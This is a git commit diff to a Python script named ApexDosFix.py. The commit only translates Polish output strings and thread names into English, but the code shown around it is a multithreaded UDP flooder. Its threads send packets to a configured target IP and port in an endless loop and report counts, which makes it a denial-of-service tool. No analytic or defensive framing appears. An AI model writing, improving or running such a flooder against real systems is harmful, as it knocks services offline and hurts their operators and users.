8f2837f862180bfd6bdb657bf003dd89d2d1f979
Apex-Arch <inowicka82@gmail.com>
2025-06-30 00:24:49 +0200

    ApexDosFix.py

--- ApexDosFix.py
+++ ApexDosFix.py
@@ -12,12 +12,12 @@ def send_packets():
         s.sendto(b"Test packet", (TARGET_IP, TARGET_PORT))
         count += 1
         if count % 100000 == 0:
-            print(f"{threading.current_thread().name}: {count} pakietów wysłanych")
+            print(f"{threading.current_thread().name}: {count} packets sent")
 
 threads = []
 
 for i in range(NUM_THREADS):
-    t = threading.Thread(target=send_packets, name=f"Wątek-{i+1}")
+    t = threading.Thread(target=send_packets, name=f"-{i+1}")
     t.start()
     threads.append(t)
 
@@ -25,4 +25,4 @@ try:
     for t in threads:
         t.join()
 except KeyboardInterrupt:
-    print("\n✅ Przerwałeś wysyłanie (Ctrl+C)")
+    print("\nStopped manually (Ctrl+C)")
